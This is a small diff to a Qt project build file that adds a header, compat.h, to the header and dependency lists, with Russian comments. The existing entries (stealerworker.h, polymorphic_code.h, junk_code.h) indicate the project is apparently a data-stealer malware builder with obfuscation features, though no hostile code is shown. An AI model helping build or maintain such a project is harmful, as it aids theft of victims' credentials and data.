@@ -18,7 +18,8 @@ HEADERS += \
     $$PWD/../src/build_key.h \
     $$PWD/../src/polymorphic_code.h \
     $$PWD/../src/junk_code.h \
-    $$PWD/../src/stealerworker.h
+    $$PWD/../src/stealerworker.h \
+    $$PWD/../src/compat.h  # Добавляем compat.h
 
 # Формы Qt Designer
 FORMS += \
@@ -123,4 +124,5 @@ PRE_TARGETDEPS += \
     $$PWD/../src/polymorphic_code.h \
     $$PWD/../src/junk_code.h \
     $$PWD/../src/stealerworker.h \
+    $$PWD/../src/compat.h \  # Добавляем compat.h в зависимости
     $$UI_DIR/ui_mainwindow.h
